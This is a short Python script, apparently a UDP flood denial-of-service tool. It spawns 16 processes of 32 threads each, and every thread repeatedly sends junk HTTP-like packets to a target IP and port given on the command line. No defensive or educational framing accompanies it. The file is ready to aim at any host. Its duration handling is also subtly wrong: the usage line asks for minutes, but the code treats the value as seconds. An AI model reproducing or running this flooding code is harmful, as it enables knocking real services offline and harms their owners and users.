import socket
import time
import threading
import multiprocessing
import sys

def send_packet(target, port, duration, packet_counter):
    start_time = time.time()

    def worker():
        nonlocal packet_counter
        local_counter = 0
        while time.time() - start_time < duration:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.close()
            local_counter += 1
            # print("Sending...")
        # Increment the global packet counter with thread safety
        with counter_lock:
            packet_counter.value += local_counter
            # print({packet_counter.value})

    threads = []
    for _ in range(32):
        thread = threading.Thread(target=worker)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python script.py <target_ip> <port> <time in minutes>")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])
    duration_in_minutes = float(sys.argv[3])

    # Use multiprocessing.Value for shared counter among processes
    packet_counter = multiprocessing.Value('i', 0)
    counter_lock = threading.Lock()

    processes = []
    for _ in range(16):
        process = multiprocessing.Process(target=send_packet, args=(target, port, duration_in_minutes, packet_counter))
        processes.append(process)
        process.start()

    for process in processes:
        process.join()

    # Print the total packet count
    print(f"Total packets sent: {packet_counter.value}")
